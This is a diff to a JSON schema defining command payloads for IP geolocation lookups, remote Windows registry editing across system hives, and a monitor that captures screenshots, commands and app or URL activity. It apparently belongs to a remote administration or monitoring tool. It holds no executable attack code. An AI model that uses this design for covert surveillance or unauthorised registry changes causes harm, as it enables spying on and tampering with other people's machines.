+    },
+    "GeoCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["status", "lookup"] },
+        "ip": { "type": "string" },
+        "provider": { "type": "string", "enum": ["ipinfo", "maxmind", "db-ip"] },
+        "includeTimezone": { "type": "boolean" },
+        "includeMap": { "type": "boolean" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "RegistryCommandPayload": {
+      "type": "object",
+      "properties": {
+        "request": { "$ref": "#/definitions/RegistryCommandRequest" }
+      },
+      "required": ["request"],
+      "additionalProperties": false
+    },
+    "RegistryCommandRequest": {
+      "type": "object",
+      "properties": {
+        "operation": { "type": "string", "enum": ["list", "create", "update", "delete"] },
+        "target": { "type": "string", "enum": ["key", "value"] },
+        "hive": { "type": "string", "enum": ["HKEY_LOCAL_MACHINE", "HKEY_CURRENT_USER", "HKEY_USERS"] },
+        "path": { "type": "string" },
+        "keyPath": { "type": "string" },
+        "parentPath": { "type": "string" },
+        "name": { "type": "string" },
+        "originalName": { "type": "string" },
+        "depth": { "type": "integer" },
+        "value": { "$ref": "#/definitions/RegistryValueInput" }
+      },
+      "required": ["operation"],
+      "additionalProperties": false
+    },
+    "RegistryValueInput": {
+      "type": "object",
+      "properties": {
+        "name": { "type": "string" },
+        "type": { "type": "string", "enum": ["REG_SZ", "REG_EXPAND_SZ", "REG_MULTI_SZ", "REG_DWORD", "REG_QWORD", "REG_BINARY"] },
+        "data": { "type": "string" },
+        "description": { "type": "string" }
+      },
+      "required": ["name", "type", "data"],
+      "additionalProperties": false
+    },
+    "TriggerMonitorCommandPayload": {
+      "type": "object",
+      "properties": {
+        "action": { "type": "string", "enum": ["status", "configure"] },
+        "config": { "$ref": "#/definitions/TriggerMonitorConfigInput" }
+      },
+      "required": ["action"],
+      "additionalProperties": false
+    },
+    "TriggerMonitorConfigInput": {
+      "type": "object",
+      "properties": {
+        "feed": { "type": "string", "enum": ["live", "batch"] },
+        "refreshSeconds": { "type": "integer" },
+        "includeScreenshots": { "type": "boolean" },
+        "includeCommands": { "type": "boolean" },
+        "watchlist": { "type": "array", "items": { "$ref": "#/definitions/TriggerMonitorWatchlistEntry" } }
+      },
+      "required": ["feed", "refreshSeconds", "includeScreenshots", "includeCommands"],
+      "additionalProperties": false
+    },
+    "TriggerMonitorWatchlistEntry": {
+      "type": "object",
+      "properties": {
+        "kind": { "type": "string", "enum": ["app", "url"] },
+        "id": { "type": "string" },
+        "displayName": { "type": "string" },
+        "alertOnOpen": { "type": "boolean" },
+        "alertOnClose": { "type": "boolean" }
+      },
+      "required": ["kind", "id", "displayName", "alertOnOpen", "alertOnClose"],
+      "additionalProperties": false
     }
   }
 }
